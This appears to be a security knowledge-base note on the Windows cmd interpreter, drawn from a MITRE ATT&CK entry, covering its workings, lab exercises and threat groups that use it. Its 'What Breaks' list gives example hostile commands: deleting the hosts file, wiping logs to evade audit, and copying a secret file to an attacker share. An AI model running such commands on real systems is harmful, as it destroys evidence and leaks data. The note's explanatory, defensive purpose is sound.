# cmd (Windows Command-Line Interpreter)

cmd is like a Swiss‑Army knife that lives inside Windows; you point it at a command, and it slices, shreds, copies, or runs whatever you ask, all from a black text window.  
**Definition:** The Windows command‑line interpreter that parses user input, executes built‑in or external commands, and provides file‑system and system‑information access.

## Why Does It Exist?
Before command‑line tools, users had to click menus for every action, which was slow and hard to automate. cmd lets administrators, developers, and attackers run repeatable scripts, perform bulk file operations, and execute binaries without the overhead of a GUI. In an incident, a malicious actor can use cmd to move laterally, delete evidence, or exfiltrate data without needing a full‑featured tool.

## How It Works (Under The Hood)
1. **Invocation** – `cmd.exe` starts as a console process.  
2. **Input Loop** – Reads a line from the standard input.  
3. **Tokenization** – Splits the line into a command name and arguments, respecting quotes and escape characters.  
4. **Command Lookup**  
   - Built‑in commands (`dir`, `del`, `copy`, `set`, etc.) are handled internally via the Windows API.  
   - External commands are located by scanning the `PATH` environment variable and checking for executables (`.exe`, `.bat`, `.cmd`).  
5. **Execution** – For built‑ins, `cmd` calls the corresponding API directly; for externals, it creates a new process with the parsed arguments.  
6. **I/O Redirection & Piping** – `>` and `|` manipulate the process’s stdin/stdout streams, enabling scripts to chain commands.  
7. **Environment Management** – Variables can be set, queried, and passed to child processes, allowing configuration and dynamic behavior.  
8. **Termination** – The loop exits when `exit` or `quit` is issued, or when the console window is closed.

## What Breaks When It Goes Wrong?
- **Deletion of Critical Files** – A `del /f /q C:\Windows\System32\drivers\etc\hosts` removes a key system file, causing network misrouting.  
- **Log Evasion** – Using `del /f /q %windir%\Temp\*.log` erases audit trails, hiding malicious activity.  
- **Privilege Escalation** – A poorly configured script that runs with elevated rights can spread malware across the domain.  
- **Resource Exhaustion** – An infinite loop (`:loop & goto loop`) consumes CPU, leading to denial of service.  
- **Data Leakage** – `copy /y C:\secret.txt \\attacker\share` writes sensitive data to a remote SMB share without encryption, exposing it to anyone who can reach that share.

In each case, the first notice often comes from an end‑user or an automated monitoring tool that detects missing files, anomalous processes, or sudden CPU spikes.

## Lab Relevance
- **Setup** – Spin up a Windows VM (preferably 64‑bit, recent build) and launch `cmd.exe`.  
- **Hands‑On Commands**  
  - `dir /s /b C:\` – recursive file listing.  
  - `copy /y file1.txt file2.txt` – duplicate a file.  
  - `del /f /q *.tmp` – force‑delete all temp files.  
  - `echo %PATH%` – view search path.  
  - `set VAR=hello` & `echo %VAR%` – test environment variable.  
  - `type C:\Windows\System32\drivers\etc\hosts | findstr 127.0.0.1` – pipe output to a search.  
- **Script Creation** – Write a `.bat` file that backs up a folder, deletes old logs, and logs operations to a text file.  
- **Observations** – Watch the console’s return codes (`%ERRORLEVEL%`), file timestamps, and event logs to see how cmd reports success or failure.  
- **Security Practice** – Try to run a malicious-looking script that deletes a harmless file, then undo with `undo` (not available, so learn to use `copy /b`) or restore from backup.  
- **Advanced** – Use `powershell -Command "..."` within cmd to bridge to PowerShell while still staying inside the command shell.

These exercises illustrate how cmd is the entry point for many automation tasks and why controlling its behavior is critical for both system administration and defensive operations.

# Threat Groups Using This Software
- [[GALLIUM]] (G0093)
- [[BRONZE BUTLER]] (G0060)
- [[APT18]] (G0026)
- [[menuPass]] (G0045)
- [[Orangeworm]] (G0071)
- [[Volt Typhoon]] (G1017)

## Associated Campaigns
- [[Operation Honeybee]] (C0006)

## Tags
#tool #windows #command-line #mitre-attack #s0106

---

_Ingested: 2026-04-15 20:48 | Source: https://attack.mitre.org/software/S0106/_